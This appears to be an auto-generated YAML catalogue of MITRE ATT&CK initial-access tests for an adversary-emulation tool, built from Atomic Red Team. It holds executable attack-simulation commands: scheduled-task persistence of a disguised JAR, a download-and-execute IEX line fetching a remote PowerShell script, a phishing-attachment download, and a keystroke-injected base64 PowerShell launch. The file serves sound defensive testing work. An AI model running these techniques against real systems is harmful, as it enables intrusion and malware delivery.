# AutoStrike MITRE ATT&CK Techniques - initial-access
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1195
  name: Supply Chain Compromise
  description: |-
    Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.

    Supply chain compromise can take place at any stage of the supply chain including:

    * Manipulation of development tools
    * Manipulation of a development environment
    * Manipulation of source code repositories (public or private)
    * Manipulation of source code in open-source dependencies
    * Manipulation of software update/distribution mechanisms
    * Comp...
  tactic: initial-access
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Octopus Scanner Malware Open Source Supply Chain
      type: cmd
      platform: windows
      command: |-
        copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db
        schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc MINUTE /f
      cleanup: |-
        schtasks /delete /tn ExplorerSync /F 2>null
        del %temp%\..\Microsoft\ExplorerSync.db 2>null
        del %temp%\ExplorerSync.db 2>null
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1195
  is_safe: false
- id: T1195.002
  name: Compromise Software Supply Chain
  description: |-
    Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.

    Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on...
  tactic: initial-access
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Simulate npm package installation on a Linux system
      type: bash
      platform: linux
      command: kubectl run atomic-npm-install --image=node:18 --restart=Never --attach --rm -i -- bash -lc "mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install tinycolor --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1195/002
  is_safe: false
- id: T1566.001
  name: Spearphishing Attachment
  description: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the sp...
  tactic: initial-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Download Macro-Enabled Phishing Attachment
      type: powershell
      platform: windows
      command: |-
        $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
      cleanup: Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore
      timeout: 120
    - name: Word spawned a command shell and used an IP address in the command line
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
        Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
      cleanup: Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1566/001
  is_safe: false
- id: T1566.002
  name: Spearphishing Link
  description: Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a tr...
  tactic: initial-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Paste and run technique
      type: powershell
      platform: windows
      command: |-
        # Add user32.dll for keybd_event
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            public class K {
                [DllImport("user32.dll")]
                public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
            }
        "@

        # Virtual key codes
        $VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0x5B, 0x52, 0x0000, 0x0002

        # Open Run dialog (Win+R)
        [K]::keybd_event($VK_LWIN, 0, $KEYDOWN, [UIntPtr]::Zero)
        [K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero)
        [K]::keybd_event($VK_R, 0, $KEYUP, [UIntPtr]::Zero)
        [K]::keybd_event($VK_LWIN, 0, $KEYUP, [UIntPtr]::Zero)

        # Short delay for Run dialog
        Start-Sleep -Milliseconds 500
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.SendKeys]::SendWait("cmd /c powershell -ec " + [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('calc.exe')) + "{ENTER}")
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1566/002
  is_safe: false
